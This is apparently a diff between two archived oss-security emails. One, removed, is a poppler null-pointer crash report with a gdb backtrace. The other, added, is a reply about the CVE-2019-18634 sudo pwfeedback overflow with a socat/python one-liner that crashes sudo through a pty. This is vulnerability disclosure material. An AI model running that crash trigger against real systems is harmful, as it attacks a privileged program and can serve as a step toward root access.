@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["3069" "Saturday" "10" "November" "2018" "16:22:53" "+0530" "Dhiraj Mishra" "mishra.dhiraj95@gmail.com" "<CAG8b5tT5Ob5b1CD=nMFWkJTfVfwvREW3vGw=rpHruB6Tj+NJtw@mail.gmail.com>" "77" "[oss-security] null-pointer dereference in poppler library" nil nil nil "11" "2018111010:52:53" "[oss-security] null-pointer dereference in poppler library" (number mark "U       mishra.dhira Nov 10   77/3069  " thread-indent "\"[oss-security] null-pointer dereference in poppler library\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1405" "Wednesday" "5" "February" "2020" "22:34:53" "+1100" "William Bowling" "will@wbowling.info" nil "50" nil "^Date:" nil nil "2" nil nil (number mark "        will@wbowlin Feb  5   50/1405  " thread-indent "\"Re: [oss-security] CVE-2019-18634: buffer overflow in sudo when pwfeedback is enabled\"\n") nil nil nil nil nil nil nil nil nil "Re: [oss-security] CVE-2019-18634: buffer overflow in sudo when pwfeedback is enabled" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0000
+X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 17555 invoked by uid 550); 10 Nov 2018 11:05:27 -0000
+Received: (qmail 25660 invoked by uid 550); 5 Feb 2020 12:19:16 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,115 +11,92 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Reply-To: oss-security@lists.openwall.com
-Received: (qmail 7711 invoked from network); 10 Nov 2018 10:53:17 -0000
+Received: (qmail 10026 invoked from network); 5 Feb 2020 11:35:15 -0000
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20161025;
-        h=mime-version:from:date:message-id:subject:to;
-        bh=HKUIMvA6qW02vpZ+bldeUQHU0BLIU1ELZ8JC13l4bZg=;
-        b=iR75boUjFFvBhdk9khnwKI6o4OVj/M7M/s3vCd+5Uq1fXC85OfryXP0QCoV9uUC+jL
-         aFIYvKK8IsFa4p2tde8HZMRcKWYaIROAOsX3Dch6kUAbIb4d/q3useqP69CDfh9nMfyV
-         lk97H9PTUKNusyMpxHZtET/GuVq2jDgsm/qhsFI9Xvt5l8Jof26ijEll1jkjdo4wY+tP
-         ULQFVSgv7CsuUHk8OcmZRddPpGsOwGeJqBuY/s6iLr2I5Ot2Nbx3aba72jehSogdg7RF
-         BlriPjoSApYAAB7ZGXeztBzD89MjTkjb/Np3V84fWrw3/ZsPjsydm3CHHIHaDAvNzC9K
-         ot6w==
+        d=wbowling.info; s=google;
+        h=mime-version:references:in-reply-to:from:date:message-id:subject:to;
+        bh=0SxJ+WwDKBihxc8LfWq+MNKWfgLO0RMkRXEySgJCHA0=;
+        b=MQyrU6Yf5PZzzfxE/aFl/VPbjV79Vjh2T3r7fRRHKXhufM82gGrh+pwrUojPKeWtP5
+         7D+VWWS0cNrrSHMAFk7MchpgtV0WSfsxVXUuFedU/pnC19fZBpoWkaMsQd9f0gCAkURB
+         pwskmuWVdDMNIr71/AnejSZnO1AdFYi8o8IcYpCKqq9qZJhbVIj07qx2zZpcf5BJyMFg
+         TRoVvIoGfGK+L3C6UvOhQL8k7JjaLsNj4+dXAzvGZjdAWAOBlo2r49t9u8XTjwPoVp3/
+         Mu0YIhHUl3Gs1SrVLc1h5Rke1AZVqK2KtfgQ5LGAR81mAYaIyKFTJo2Em6EjbmmKLnrd
+         fwXQ==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
         d=1e100.net; s=20161025;
-        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
-        bh=HKUIMvA6qW02vpZ+bldeUQHU0BLIU1ELZ8JC13l4bZg=;
-        b=Gx8ChM7/Zk6l1s6otkm5I0sWJs3UJzKFprBT5wLCRg5Vb4YArwZoPxjFWnvekApYo/
-         Fc8hzqRJhJjbbcoICYgNUcdpLgTv9QwgpmtwJnKL3ZPRmKUAx1hhoVp6gyQ66qrsXYsz
-         xklJnX9dEywb57PNBvm3ooiBMXUnrA/6nAuWcwNsK6bNkP85B7LHEkqWtcSW1t0aiTLR
-         wMJ0jKcalTE569wEY8EZzGbaj/rS8G+Z9icaubIRQ7A0g+TUK7mDXEGeMXnmHe8cLgaX
-         GzfHNHYqgkWEBRfXATw/Edbdl/cmp4ipWDlo2ldxoSPnbFvf5ARA1CaNbjhA8Ilvp8qT
-         bDyg==
-X-Gm-Message-State: AGRZ1gLpMa9qYuC2uk5WOURaF2xppqjIjbXX/u46Wh4XMY7CDss8i/zs
-	t0cX0S91mf2M1MyoRX01OH1cGHAc/fEfxoFjrhG0X/Ct
-X-Google-Smtp-Source: AJdET5caMoEjmyqR/6WfS2ipAYamYXoEgfNlUihFYV0TdykQC0criv4MZPiChRNUK5Yb7UxyUxm3v+gNv/jDVrGkrZg=
-X-Received: by 2002:a62:848e:: with SMTP id k136-v6mr12540765pfd.115.1541847184847;
- Sat, 10 Nov 2018 02:53:04 -0800 (PST)
+        h=x-gm-message-state:mime-version:references:in-reply-to:from:date
+         :message-id:subject:to;
+        bh=0SxJ+WwDKBihxc8LfWq+MNKWfgLO0RMkRXEySgJCHA0=;
+        b=JWuRV391Q6Y4zQrfPI0n4SvGSqyvSvLOB51LoEBoGZVmcw82Q47wnBBmMq+umbTebL
+         sE8rtyiw0tgTkiZqa6nKk+ux1eUGa+l3D7AyqrvGXmkgzPQEltwoDyFWCY4TccgEWaB9
+         PoXyBq5wd81/6d/c+VtvHhoqLaTeCm40y4onQU0sB+SkrmX3rzbwN+a61HqvpO2DDJGn
+         QFUZl+Ot7hqEOUagtA+acgOSupQ4UeFOL8iDET3vR9ObWfcnSUMZi+MzG4rHA5h/s385
+         fyXsAyxKkrLINBnZZpPSA1pXkBXIIM6i3Xfbm+IqfOiUJ2cb/wMQ6A2f6tBLYkWssOR6
+         ElDA==
+X-Gm-Message-State: APjAAAUJOUQ1AiSKrz733LZKUC4y23kUeH5T0yx7bifyIiSXDSHm1fsJ
+	1XCB3tvBMiLM3/B7MX9SG6ntI6X4iHtIcFNX+8gBAGCkqMI=
+X-Google-Smtp-Source: APXvYqzW6TfCvt4kRE4FQbbrV7tFmzQGsvZIVqN1egK6KhVA9ZB3k48oowybHW6pxx+NR7HEkW36Gq/CJbyHwjmfM7k=
+X-Received: by 2002:a5d:6703:: with SMTP id o3mr26831328wru.235.1580902504020;
+ Wed, 05 Feb 2020 03:35:04 -0800 (PST)
 MIME-Version: 1.0
-From: Dhiraj Mishra <mishra.dhiraj95@gmail.com>
-Date: Sat, 10 Nov 2018 16:22:53 +0530
-Message-ID: <CAG8b5tT5Ob5b1CD=nMFWkJTfVfwvREW3vGw=rpHruB6Tj+NJtw@mail.gmail.com>
+References: <aff313846ed736fa@sudo.ws>
+In-Reply-To: <aff313846ed736fa@sudo.ws>
+Message-ID: <CAPWJUny2yaenu_Kg7s4VhuL0nZ4Yg4XPN9HN75e5w0MU4brTnw@mail.gmail.com>
+Content-Type: multipart/alternative; boundary="0000000000002d5094059dd28c59"
+Date: Wed, 5 Feb 2020 22:34:53 +1100
+From: William Bowling <will@wbowling.info>
+Reply-To: oss-security@lists.openwall.com
+Subject: Re: [oss-security] CVE-2019-18634: buffer overflow in sudo when
+ pwfeedback is enabled
 To: oss-security@lists.openwall.com
-Content-Type: multipart/alternative; boundary="000000000000c03917057a4d4503"
-Subject: [oss-security] null-pointer dereference in poppler library
 
---000000000000c03917057a4d4503
+--0000000000002d5094059dd28c59
 Content-Type: text/plain; charset="UTF-8"
 
-## Summary
+When using a pty, sudo_term_eof and sudo_term_kill are initialized to 0x4
+and 0x15 allowing the overflow to be reached, making 1.8.26-1.8.30 also
+vulnerable:
 
-While fuzzing evince v3.28.4, on linux 4.15.0-38-generic (Ubuntu 18.04
-LTS), a null-pointer dereference was observed, initially this was reported
-to evince but the evince team advised that the issue is in poppler, the
-library used by evince to render PDF. Poppler version: 0.62.0-2ubuntu2.2 is
-vulnerable to null-pointer dereference, however the issue is already fixed
-in poppler 0.70, but this will still crash your evince v3.28.4 if poppler
-is not updated to v.0.70.
+$ socat pty,link=/tmp/pty,waitslave exec:"python -c
+'print((\"A\"*100+chr(0x15))*50)'" &
+$ sudo -S id < /tmp/pty
+[sudo] password for user1: Segmentation fault
+$ sudo -V
+Sudo version 1.8.30
+Sudoers policy plugin version 1.8.30
+Sudoers file grammar version 46
+Sudoers I/O plugin version 1.8.30
 
-## Debug
+- Will
 
-(gdb) run NullPointerDeference.h_134
-Starting program: /usr/bin/evince NullPointerDeference.h_134
-[Thread debugging using libthread_db enabled]
-Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
-[New Thread 0x7fd84d3cf700 (LWP 17587)]
-[New Thread 0x7fd84cbce700 (LWP 17588)]
-[New Thread 0x7fd84718c700 (LWP 17589)]
-[New Thread 0x7fd84651c700 (LWP 17594)]
-[New Thread 0x7fd845b0e700 (LWP 17596)]
-[New Thread 0x7fd83223e700 (LWP 17597)]
+On Sat, Feb 1, 2020 at 12:59 AM Todd C. Miller <Todd.Miller@sudo.ws> wrote:
 
-Thread 7 "EvJobScheduler" received signal SIGSEGV, Segmentation fault.
-[Switching to Thread 0x7fd83223e700 (LWP 17597)]
-0x00007fd8315f629a in _poppler_attachment_new(FileSpec*) () from
-/usr/lib/x86_64-linux-gnu/libpoppler-glib.so.8
-(gdb) bt
-#0  0x00007fd8315f629a in _poppler_attachment_new(FileSpec*) () at
-/usr/lib/x86_64-linux-gnu/libpoppler-glib.so.8
-#1  0x00007fd8315fa14a in poppler_annot_file_attachment_get_attachment ()
-at /usr/lib/x86_64-linux-gnu/libpoppler-glib.so.8
-#2  0x00007fd83183673d in  () at
-/usr/lib/x86_64-linux-gnu/evince/4/backends/libpdfdocument.so
-#3  0x00007fd8592c3bfa in  () at /usr/lib/x86_64-linux-gnu/libevview3.so.3
-#4  0x00007fd8592c5c02 in  () at /usr/lib/x86_64-linux-gnu/libevview3.so.3
-#5  0x00007fd856bbee85 in  () at /usr/lib/x86_64-linux-gnu/libglib-2.0.so.0
-#6  0x00007fd8565956db in start_thread (arg=0x7fd83223e700) at
-pthread_create.c:463
-#7  0x00007fd8562be88f in clone () at
-../sysdeps/unix/sysv/linux/x86_64/clone.S:95
-(gdb) i r
-rax            0x0    0
-rbx            0x0    0
-rcx            0x0    0
-rdx            0x0    0
-rsi            0x7fd82c0587c0    140566428223424
-rdi            0x55720784c640    93948240774720
-rbp            0x7fd834004a90    0x7fd834004a90
-rsp            0x7fd83223d9e0    0x7fd83223d9e0
-r8             0xffffffffffffffb0    -80
-r9             0x10    16
-r10            0x7fd82c0008d0    140566427863248
-r11            0x1    1
-r12            0x7fd82c0587c0    140566428223424
-r13            0x7fd834004a80    140566562097792
-r14            0x5572072f5a60    93948235176544
-r15            0x0    0
-rip            0x7fd8315f629a    0x7fd8315f629a
-<_poppler_attachment_new(FileSpec*)+122>
-eflags         0x10206    [ PF IF RF ]
-cs             0x33    51
-ss             0x2b    43
-ds             0x0    0
-es             0x0    0
-fs             0x0    0
-gs             0x0    0
-(gdb) info reg ebp rip
-ebp            0x34004a90    872434320
-rip            0x7fd8315f629a    0x7fd8315f629a
-<_poppler_attachment_new(FileSpec*)+122>
-(gdb)
+> On Thu, 30 Jan 2020 11:23:28 -0700, "Todd C. Miller" wrote:
+>
+> > Sudo versions affected:
+> >
+> > Sudo versions 1.7.1 to 1.8.30 inclusive are affected but only if
+> > the "pwfeedback" option is enabled in sudoers.
+>
+> It turns out a change in EOF handling introduced in sudo 1.8.26
+> prevents exploitation of the bug.  The EOF character is also
+> initialized to 0 and sudo 1.8.26 checks for EOF before it checks
+> for the kill character.
+>
+> This means that the bug actually affects sudo versions 1.7.1 to
+> 1.8.25p1 inclusive.
+>
+> Sorry for the oversight.  I've updated the affected versions in
+> https://www.sudo.ws/alerts/pwfeedback.html
+>
+>  - todd
+>
 
---000000000000c03917057a4d4503--
+
+-- 
+
+GPG Key ID: 0x980F711A
+
+GPG Key Fingerprint: AA38 2A0E 7D22 18A9 6086  0289 41DC E04B 980F 711A
+
+--0000000000002d5094059dd28c59--
